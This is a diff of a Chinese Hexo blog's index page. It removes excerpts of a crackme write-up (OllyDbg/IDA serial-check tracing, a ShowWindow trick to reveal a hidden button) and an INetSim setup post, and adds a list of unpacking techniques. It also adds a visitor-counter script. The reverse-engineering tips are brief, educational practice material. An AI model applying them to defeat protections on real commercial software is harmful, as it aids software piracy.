+              <time title="创建时间：2017-08-09 00:00:00" itemprop="dateCreated datePublished" datetime="2017-08-09T00:00:00+08:00">2017-08-09</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -928,96 +1144,22 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>###步骤如下</p>
-<p>1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1hr5CtpU">http://pan.baidu.com/s/1hr5CtpU</a> 密码：r9wi</p>
-<p>2.首先运行题目，如下图所示，跟平常的题目没什么两样。随便输入字符串，发现弹出报错信息。咋一看，有关键字符串，好咧，这题不难，肯定可以找到关键挑战，然后问题就简单了。（太天真。。。）</p>
-<p><img src="http://i.imgur.com/60iDg8y.png"></p>
-<p>3  打开OD载入程序，搜索字符串，发现关键字符串，很高兴。</p>
-<p><img src="http://i.imgur.com/J9OcWmh.png"></p>
-<p>在字符串上方发现两个跳转都跳到失败处，猜想应该是二次验证，一个一个分析，分析第一个call crackme.00402e40 ，发现是对输入的字符串进行一系列处理，然后得到一个数值，在下面语句中发现是和0x92381221 进行比较。不等则跳转向失败，打开IDA，分析关键call ,发现0x92381221代表的十进制数2453148193刚好符合条件，心中顿感，我实在是太聪明了。</p>
-<p><img src="http://i.imgur.com/gT8tpJM.png"></p>
-<p>继续往下看下一个跳转，call crackme.00401DF0,发现是两个字符串比较，猜想是我们前面的字符串进行再次的运算得到一堆字符串然后比较，然后分析可得处理函数为call crackme.00401990,分析关键call 发现是把输入进行MD5运算得到的一堆字符串。沃日。。。这控制不了啊。。。然后感觉不太对，于是我尝试暴力把跳转改一下，看会出现什么情况。发现既弹出了成功，又弹出来失败，感觉不对。</p>
-<p>4.想着对消息框下个断点，F9运行，点击工具栏的W发现，竟然出现了两个输入Input,觉得肯定玄机在此，觉得其中一个按钮一定是被隐藏了，在command 位置下断点，输入 bp ShowWindow,寻找ShowWindow函数，重新运行程序，发现运行到了用户层，alt+f9运行出来，发现前面就是ShowWindow 窗口在此下断点，删除刚刚下的user32里的断点，发现参数信息为0时，为隐藏，为1时为显现，于是更改参数值如下图所示：</p>
+          <p>总结方法如下：</p>
+<p>1、单步跟（向上的跳转下一步F4）</p>
+<p>2、esp定律</p>
+<p>3、二次内存镜像</p>
+<p>4、一次到位</p>
+<p>5、模拟跟踪</p>
+<blockquote>
+<p>tc eip&lt;sfx</p>
+<p>调试 sfx  第二个</p>
+</blockquote>
+<p>6、最后一次异常</p>
+<p>7、特殊方法</p>
+<p>at GetVersion等</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2017/08/01/%E8%BF%B7%E8%B7%AF/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2017/07/22/inetsim/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="fengchuiguo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fengchuiguo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2017/07/22/inetsim/" class="post-title-link" itemprop="url">搭建虚拟网络环境inetsim</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2017-07-22 00:00:00" itemprop="dateCreated datePublished" datetime="2017-07-22T00:00:00+08:00">2017-07-22</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p> 主要步骤详见</p>
-<p>1.inetsim 安装详见<a target="_blank" rel="noopener" href="http://www.inetsim.org/packages.html">http://www.inetsim.org/packages.html</a></p>
-<p>2.inetsim 配置详见<a target="_blank" rel="noopener" href="http://www.cnblogs.com/hyq20135317/p/5515675.html">http://www.cnblogs.com/hyq20135317/p/5515675.html</a></p>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2017/07/22/inetsim/#more" rel="contents">
+              <a class="btn" href="/2017/08/09/%E9%80%86%E5%90%91/%E5%B8%B8%E8%A7%84%E8%84%B1%E5%A3%B3/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1106,20 +1248,20 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-count">90</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1146,7 +1288,7 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -1155,7 +1297,31 @@ eax保存的就是所有要分配的空间，每次分配一页之后也减去10
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
         
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
 
 
 
